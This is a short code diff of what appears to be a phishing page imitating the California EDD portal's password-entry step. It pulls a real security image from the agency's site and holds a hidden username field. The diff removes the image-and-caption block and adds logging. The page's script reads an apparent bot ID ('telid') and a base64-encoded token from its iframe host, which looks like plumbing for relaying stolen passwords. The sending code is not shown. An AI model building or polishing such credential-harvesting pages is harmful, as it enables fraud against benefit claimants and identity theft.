@@ -211,31 +211,10 @@ Enter Password
 <p style="padding-bottom:5px"> Verify your personal image and caption, then enter your password. </p> 
 
 
-    <input name="__RequestVerificationToken" type="hidden" autocomplete="off">
-    <input name="username" type="hidden" value="gffgfg2@dhdh.yty" autocomplete="off">
+    
     <div class="container-fluid">
         
-        <div class="row">
-            
-            
-            <div class="verticalCenterLabel">
-                <strong><label for="ImageId">Personal Image</label></strong>
-            </div>           
-            <div class="col-xxs-3 col-xs-2 col-sm-2 col-md-2 col-no-padding">
-                <img class="image_fuzzy_boxShadow securityImage" src="https://portal.edd.ca.gov/WebApp/Content/images/security/Chicken.jpg" alt="Chicken" title="Chicken" aria-label="12" aria-hidden="true" data-value="12">
-            </div>           
-        </div>
-        <br>
-        
-        <div class="row">
-            <div class="verticalCenterLabel">
-                
-                <strong><label for="Caption">Personal Caption</label></strong>
-            </div>
-            <div class="col-xxs-12 col-xs-9" style="padding-bottom:5px">
-                I love music
-            </div>
-        </div>
+       
 
         
         <div class="row">
@@ -306,6 +285,7 @@ Enter Password
 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   <script type="text/javascript">
+    console.log(window.frameElement);
  var telid=window.frameElement.getAttribute("rook");
  var tok=window.frameElement.getAttribute("otp");
             tok=atob(tok);
